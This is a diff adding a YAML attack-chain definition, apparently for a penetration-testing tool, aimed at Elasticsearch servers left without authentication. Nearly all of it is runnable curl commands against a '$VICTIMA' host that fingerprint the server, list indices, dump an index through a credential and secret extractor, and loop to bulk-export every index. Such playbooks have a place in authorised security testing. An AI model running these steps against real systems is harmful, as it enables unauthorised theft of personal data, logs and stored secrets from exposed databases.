@@ -1,0 +1,41 @@
+chain_id: elasticsearch_no_auth
+title: "Elasticsearch — anonymous read all indices"
+severity: HIGH
+tags: [elasticsearch, no-auth, data-disclosure]
+
+trigger:
+  any_of:
+    - { port: 9200 }
+    - { port: 9300 }
+    - { service_pattern: "(?i)elasticsearch" }
+
+description: |
+  Open Elasticsearch with default config. The REST API on 9200 is
+  unauthenticated — list indices, dump documents, often containing
+  unredacted PII, application logs with stack traces and secrets, and
+  full request/response captures.
+
+steps:
+  - id: 1
+    title: "Confirm and fingerprint the version"
+    command: curl -s http://$VICTIMA:9200/
+
+  - id: 2
+    title: "List every index"
+    command: curl -s 'http://$VICTIMA:9200/_cat/indices?v'
+
+  - id: 3
+    title: "Dump a single index (first 1000 docs)"
+    command: |
+      curl -s 'http://$VICTIMA:9200/INDEX/_search?pretty&size=1000' > index.json
+      rootctl extract index.json   # pulls hashes / creds / secrets
+
+  - id: 4
+    title: "Bulk export everything"
+    command: |
+      for idx in $(curl -s 'http://$VICTIMA:9200/_cat/indices?h=index'); do
+        curl -s "http://$VICTIMA:9200/$idx/_search?size=10000" > "$idx.json"
+      done
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch
